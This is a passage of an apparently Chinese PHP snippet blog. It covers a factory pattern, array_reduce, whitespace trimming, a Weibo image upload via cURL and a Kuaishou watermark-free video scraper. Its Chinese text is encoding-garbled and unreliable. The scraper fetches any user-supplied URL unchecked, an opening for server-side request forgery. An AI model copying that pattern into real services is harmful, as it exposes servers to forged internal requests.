class="string">'4'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>];</span><br><span class="line">        $checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        foreach (range(<span class="number">0</span>, strlen($idBody) - <span class="number">1</span>) <span class="keyword">as</span> $index =&gt; $item) &#123;</span><br><span class="line">            $checksum += substr($idBody, $index, <span class="number">1</span>) * $factor[$index];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $code[$checksum % <span class="number">11</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç®€å•å·¥å‚æ¨¡å¼"><a href="#ç®€å•å·¥å‚æ¨¡å¼" class="headerlink" title="ç®€å•å·¥å‚æ¨¡å¼"></a>ç®€å•å·¥å‚æ¨¡å¼</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼é‡æ–°å®ç°è¾¾åˆ°è§£è€¦çš„ç›®çš„</span><br><span class="line"></span><br><span class="line">å°†åŠ å‡ä¹˜é™¤è§£è€¦ï¼Œæ¯ä¸€ä¸ªè¿ç®—ç”¨å•ç‹¬çš„ç±»å»å†™ï¼Œå†ç”¨å·¥å‚æ¨¡å¼å®ä¾‹åŒ–å‡ºåˆé€‚çš„å¯¹è±¡ï¼Œé€šè¿‡å¤šæ€è¿”å›è®¡ç®—å™¨ç»“æœï¼Œåé¢å¦‚æœå†åŠ ä¸€ä¸ªå¹³æ–¹æ ¹è¿ç®—å¯ä»¥æ–°å¢ä¸€ä¸ªå¹³æ–¹æ ¹çš„ç±»ï¼Œå¦‚æœéœ€è¦ä¿®æ”¹åŠ æ³•è¿ç®—ï¼Œé‚£å°±åªéœ€è¦ä¿®æ”¹ OperationAdd ç±»ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $num1;</span><br><span class="line">    public $num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationAdd</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;num1 + $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationSub</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;num1 - $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationMul</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;num1 * $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationDiv</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;num2 != <span class="number">0</span>) &#123;</span><br><span class="line">            $result = $<span class="keyword">this</span>-&gt;num1 / $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = <span class="string">"é™¤æ•°ä¸èƒ½ä¸º0"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createOperate</span>(<span class="params">$symbol</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($symbol) &#123;<span class="comment">//å¤šæ€</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationAdd();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationSub();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationMul();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationDiv();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $result = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$operationFactory = OperationFactory::createOperate(<span class="string">'+'</span>);</span><br><span class="line">$operationFactory-&gt;num1 = <span class="number">21</span>;</span><br><span class="line">$operationFactory-&gt;num2 = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">echo $operationFactory-&gt;getResult();<span class="comment">//32  https://learnku.com/articles/32491</span></span><br></pre></td></tr></table></figure>
<h3 id="array-reduce-å¤šå€¼åŒ–ä¸€"><a href="#array-reduce-å¤šå€¼åŒ–ä¸€" class="headerlink" title="array_reduce å¤šå€¼åŒ–ä¸€"></a>array_reduce å¤šå€¼åŒ–ä¸€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">array_reduce å‡½æ•°å†…éƒ¨å®ç°æœºåˆ¶ï¼Œæ›´ç±»ä¼¼äºå¦‚ä¸‹ä»£ç </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">array_reduce2</span>(<span class="params">$array, $callback, $initial=null</span>)</span>&#123;</span><br><span class="line">        $acc = $initial;</span><br><span class="line">        foreach($array <span class="keyword">as</span> $a)</span><br><span class="line">            $acc = $callback($acc, $a);</span><br><span class="line">        <span class="keyword">return</span> $acc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   array_reduce2([<span class="number">2</span>,<span class="number">4</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$carry,$x</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  $carry+$x;</span><br><span class="line">    &#125;);  <span class="comment">// 6</span></span><br><span class="line">    å°†ä¸€ä¸ªåºåˆ—å‡½æ•°çš„åµŒå¥—è°ƒç”¨ç»„åˆä¸º array_reduce äº§ç”Ÿçš„æ–°å‡½æ•°è°ƒç”¨</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...$functions</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array_reduce(</span><br><span class="line">            $functions,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">$carry,$function</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">$x</span>)<span class="title">use</span>(<span class="params">$carry,$function</span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> $<span class="function"><span class="keyword">function</span>(<span class="params">$carry($x</span>));</span></span><br><span class="line"><span class="function">                &#125;;</span></span><br><span class="line"><span class="function">            &#125;,</span></span><br><span class="line"><span class="function">            <span class="title">function</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $x;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    æ•ˆæœ</span><br><span class="line">    $compose = compose(</span><br><span class="line">        <span class="comment">// åŠ  2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $x + <span class="number">2</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// ä¹˜ 4</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $x * <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    $res = $compose(<span class="number">3</span>); <span class="comment">// ï¼ˆ3+2ï¼‰*4 = 20  https://learnku.com/articles/32417</span></span><br></pre></td></tr></table></figure>
<h3 id="è¿‡æ»¤ç©ºç™½å­—ç¬¦"><a href="#è¿‡æ»¤ç©ºç™½å­—ç¬¦" class="headerlink" title="è¿‡æ»¤ç©ºç™½å­—ç¬¦"></a>è¿‡æ»¤ç©ºç™½å­—ç¬¦</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$s=<span class="string">"ã€€ã€€ç©ºç™½å­—ç¬¦"</span>;</span><br><span class="line">&gt;&gt;&gt; strlen($s)</span><br><span class="line">=&gt; <span class="number">18</span></span><br><span class="line">è¯´æ˜å‰<span class="number">2</span>ä¸ªå­—ç¬¦é•¿åº¦ä¸º<span class="number">6</span>ï¼Œæ˜¯å…¨è§’ç©ºæ ¼</span><br><span class="line">&gt;&gt;&gt; json_encode([<span class="string">'ã€€'</span>])</span><br><span class="line">=&gt; <span class="string">"["</span>\u3000<span class="string">"]"</span></span><br><span class="line">&gt;&gt;&gt; preg_replace(<span class="string">"/\s+/u"</span>, <span class="string">""</span>,$s)</span><br><span class="line">=&gt; <span class="string">"ç©ºç™½å­—ç¬¦"</span></span><br><span class="line">&gt;&gt;&gt; preg_replace(<span class="string">"/\s+/"</span>, <span class="string">""</span>,$s)</span><br><span class="line">=&gt; <span class="string">"ã€€ã€€ç©ºç™½å­—ç¬¦"</span></span><br><span class="line">&gt;&gt;&gt; preg_replace(<span class="string">"/\x&#123;3000&#125;+/u"</span>,<span class="string">''</span>,$s)</span><br><span class="line">=&gt; <span class="string">"ç©ºç™½å­—ç¬¦"</span></span><br><span class="line">&gt;&gt;&gt; trim($s,<span class="string">'ã€€'</span>)</span><br><span class="line">=&gt; <span class="string">"ç©ºç™½å­—ç¬¦"</span></span><br></pre></td></tr></table></figure>
<h3 id="curl-ä¸Šä¼ å›¾ç‰‡"><a href="#curl-ä¸Šä¼ å›¾ç‰‡" class="headerlink" title="curl ä¸Šä¼ å›¾ç‰‡"></a>curl ä¸Šä¼ å›¾ç‰‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://myServerURL"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$fields = [</span></span><br><span class="line"><span class="regexp">    'image' =&gt; new \CurlFile(realpath($_FILES['img']['tmp_name']) )</span></span><br><span class="line"><span class="regexp">];</span></span><br><span class="line"><span class="regexp">curl_setopt($resource, CURLOPT_POSTFIELDS, $fields);</span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/stackoverflow.com/</span>questions/<span class="number">21905942</span>/posting-raw-image-data-<span class="keyword">as</span>-multipart-form-data-<span class="keyword">in</span>-curl</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/vanwee/p/10341298.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file, $multipart = true</span>) </span>&#123;</span><br><span class="line">    $cookie = <span class="string">''</span>;    <span class="comment">// å¾®åšcookie</span></span><br><span class="line">    $url = <span class="string">'http://picupload.service.weibo.com/interface/pic_upload.php'</span></span><br><span class="line">    .<span class="string">'?mime=image%2Fjpeg&amp;data=base64&amp;url=0&amp;markpos=1&amp;logo=&amp;nick=0&amp;marks=1&amp;app=miniblog'</span>;</span><br><span class="line">    <span class="keyword">if</span>($multipart) &#123;</span><br><span class="line">        $url .= <span class="string">'&amp;cb=http://weibo.com/aj/static/upimgback.html?_wv=5&amp;callback=STK_ijax_'</span>.time();</span><br><span class="line">        <span class="keyword">if</span> (class_exists(<span class="string">'CURLFile'</span>)) &#123;     <span class="comment">// php 5.5</span></span><br><span class="line">            $post[<span class="string">'pic1'</span>] = <span class="keyword">new</span> CURLFile(realpath($file));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $post[<span class="string">'pic1'</span>] = <span class="string">'@'</span>.realpath($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $post[<span class="string">'b64_data'</span>] = base64_encode(file_get_contents($file));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Curlæäº¤ https://cloud.tencent.com/developer/article/1147512</span></span><br><span class="line">    $ch = curl_init($url);</span><br><span class="line">    curl_setopt_array($ch, array(</span><br><span class="line">        CURLOPT_POST =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_VERBOSE =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_HTTPHEADER =&gt; array(<span class="string">"Cookie: $cookie"</span>),</span><br><span class="line">        CURLOPT_POSTFIELDS =&gt; $post,</span><br><span class="line">    ));</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="comment">// æ­£åˆ™è¡¨è¾¾å¼æå–è¿”å›ç»“æœä¸­çš„jsonæ•°æ®</span></span><br><span class="line">    preg_match(<span class="string">'/(&#123;.*)/i'</span>, $output, $match);</span><br><span class="line">    <span class="keyword">if</span>(!isset($match[<span class="number">1</span>])) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">return</span> $match[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">upload(<span class="string">'mypic.jpg'</span>, <span class="literal">true</span>);  <span class="comment">// multipartæ–¹å¼ä¸Šä¼ </span></span><br><span class="line">upload(<span class="string">'http://www.mysite.cn/mypic.jpg'</span>, <span class="literal">false</span>);  <span class="comment">// émultipartæ–¹å¼(base64)ä¸Šä¼ </span></span><br></pre></td></tr></table></figure>
<h3 id="å¿«æ‰‹çŸ­è§†é¢‘æ— æ°´å°"><a href="#å¿«æ‰‹çŸ­è§†é¢‘æ— æ°´å°" class="headerlink" title="å¿«æ‰‹çŸ­è§†é¢‘æ— æ°´å°"></a>å¿«æ‰‹çŸ­è§†é¢‘æ— æ°´å°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> guzzlehttp/guzzle</span><br><span class="line">https:<span class="comment">//github.com/leixiaokou/kuaishou</span></span><br><span class="line"><span class="built_in">require</span> __DIR__.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$headers = [</span><br><span class="line">  <span class="string">'Connection'</span> =&gt; <span class="string">'keep-alive'</span>,</span><br><span class="line">  <span class="string">'User-Agent'</span>=&gt;<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 Version/12.0 Safari/604.1'</span></span><br><span class="line">];</span><br><span class="line">$client = <span class="keyword">new</span> \GuzzleHttp\Client([<span class="string">'timeout'</span> =&gt; <span class="number">2</span>, <span class="string">'headers'</span> =&gt; $headers, <span class="string">'http_errors'</span> =&gt; <span class="literal">false</span>,]);</span><br><span class="line">$data[<span class="string">'headers'</span>] = $headers;</span><br><span class="line">$jar = <span class="keyword">new</span> \GuzzleHttp\Cookie\CookieJar;</span><br><span class="line">$data[<span class="string">'cookies'</span>] = $jar;</span><br><span class="line">$response = $client-&gt;request(<span class="string">'GET'</span>, $url, $data);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"><span class="keyword">if</span> ($body <span class="keyword">instanceof</span> \GuzzleHttp\Psr7\Stream) &#123;</span><br><span class="line">  $body = $body-&gt;getContents();</span><br><span class="line">&#125;</span><br><span class="line">$result = htmlspecialchars_decode($body);</span><br><span class="line">$pattern = <span class="string">'#"srcNoMark":"(.*?)"#'</span>;</span><br><span class="line">preg_match($pattern, $result, $match);</span><br><span class="line">$data = [</span><br><span class="line">  <span class="string">'video_src'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'cover_image'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">if</span> (empty($match[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$data[<span class="string">'video_src'</span>] = $match[<span class="number">1</span>];</span><br><span class="line">$pattern = <span class="string">'#"poster":"(.*?)"#'</span>;</span><br><span class="line">preg_match($pattern, $result, $match);</span><br><span class="line"><span class="keyword">if</span> (!empty($match[<span class="number">1</span>])) &#123;</span><br><span class="line">  $data[<span class="string">'cover_image'</span>] = $match[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">echo json_encode($data);</span><br><span class="line">ç®€å•æ˜“ç”¨çš„è·å–æ— æ°´å°çŸ­è§†é¢‘æ’­æ”¾åœ°å€ï¼Œæ¯”å¦‚æŠ–éŸ³æ— æ°´å°ï¼Œå¿«æ‰‹æ— æ°´å°ï¼Œå¾®è§†æ— æ°´å°æ¥å£æœåŠ¡</span><br><span class="line">https:<span class="comment">//v.taokeduo.cn/api?uid=åº”ç”¨uid&amp;url=çŸ­è§†é¢‘å¹³å°çš„åˆ†äº«é“¾æ¥</span></span><br><span class="line">ä¾‹å¦‚ï¼šhttps:<span class="comment">//v.taokeduo.cn/api?uid=06217e0cdb27d0200e3a4690f8907fd2&amp;url=https://v.douyin.com/vc4bUC/</span></span><br></pre></td></tr></table></figure>
<h3 id="æ ¹æ®å¦å¤–ä¸€ä¸ªæ•°ç»„å»é‡"><a href="#æ ¹æ®å¦å¤–ä¸€ä¸ªæ•°ç»„å»é‡" class="headerlink" title="æ ¹æ®å¦å¤–ä¸€ä¸ªæ•°ç»„å»é‡"></a>æ ¹æ®å¦å¤–ä¸€ä¸ªæ•°ç»„å»é‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArray</span>(<span class="params">$arr, $plugins</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$arr)&#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        $tmp = [];<span class="comment">//ç›¸åŒçš„midæ”¾ä¸€èµ·</span></span><br><span class="line">        foreach ($arr <span class="keyword">as</span> $key =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isset($tmp[$v[<span class="string">'mid'</span>]])) &#123;</span><br><span class="line">                $tmp[$v[<span class="string">'mid'</span>]][] = $v;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $tmp[$v[<span class="string">'mid'</span>]] = [$v];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [];</span><br><span class="line">        foreach ($tmp <span class="keyword">as</span> $key =&gt; &amp;$value) &#123;</span><br><span class="line">            $has = <span class="number">0</span>;</span><br><span class="line">            foreach ($value <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($v[<span class="string">'is_top'</span>] == <span class="number">1</span>) &#123;<span class="comment">//ç½®é¡¶çš„ä¼˜å…ˆå–</span></span><br><span class="line">                    $data[] = $v;</span><br><span class="line">                    $has = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!$has) &#123;</span><br><span class="line">                foreach ($value <span class="keyword">as</span> $k =&gt; &amp;$v) &#123;</span><br><span class="line">                    $v[<span class="string">'sort'</span>] = array_search($v[<span class="string">'plugin'</span>], $plugins);<span class="comment">//è·å–åœ¨å¦å¤–ä¸€ä¸ªæ•°ç»„çš„é¡ºåº</span></span><br><span class="line">                &#125;</span><br><span class="line">                $value =  arraySort($value,<span class="string">'sort'</span>,SORT_ASC);</span><br><span class="line">                $data[] = $value[<span class="number">0</span>];<span class="comment">//è·å–å»é‡åçš„ç¬¬ä¸€ä¸ª</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">arraySort</span>(<span class="params">$array, $key, $sort = SORT_DESC</span>) </span>&#123;</span><br><span class="line">            $keysValue = [];</span><br><span class="line">            foreach ($array <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $keysValue[$k] = $v[$key];</span><br><span class="line">            &#125;</span><br><span class="line">            array_multisort($keysValue, $sort, $array);</span><br><span class="line">            <span class="keyword">return</span> $array;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="è·å–å­—ç¬¦ä¸²å†…çš„é“¾æ¥"><a href="#è·å–å­—ç¬¦ä¸²å†…çš„é“¾æ¥" class="headerlink" title="è·å–å­—ç¬¦ä¸²å†…çš„é“¾æ¥"></a>è·å–å­—ç¬¦ä¸²å†…çš„é“¾æ¥</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all(<span class="string">'/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i'</span>,strip_tags($content),$m);</span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/29685" target="_blank" rel="noopener">TCP/IP åè®®</a></p>
<p><a href="https://learnku.com/articles/30341" target="_blank" rel="noopener">PHP è®¾è®¡æ¨¡å¼</a></p>
<p><a href="https://learnku.com/articles/25813" target="_blank" rel="noopener">phpé”™è¯¯å’Œå¼‚å¸¸</a></p>
<p><a href="https://learnku.com/articles/22942" target="_blank" rel="noopener">PHP æ“ä½œ Redis </a></p>
<p><a href="https://learnku.com/articles/24802" target="_blank" rel="noopener">Redis åŸºç¡€</a></p>
<p><a href="https://github.com/wujunze/php-geo" target="_blank" rel="noopener">PHPåœ°ç†ä½ç½®</a></p>
